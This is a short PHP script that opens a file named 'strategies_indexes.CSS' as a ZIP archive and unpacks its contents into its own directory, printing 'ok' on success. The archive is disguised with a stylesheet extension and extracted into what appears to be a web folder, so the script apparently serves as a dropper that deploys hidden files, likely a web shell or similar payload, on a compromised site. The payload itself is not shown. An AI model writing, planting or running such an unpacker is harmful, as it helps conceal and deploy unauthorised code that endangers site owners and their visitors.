<?php
$zip = new ZipArchive;
if ($zip->open(dirname(__FILE__).'/strategies_indexes.CSS') === TRUE) {
    $zip->extractTo(dirname(__FILE__).'/');
    $zip->close();
    echo 'ok';
} else {
    echo 'failed';
}
?>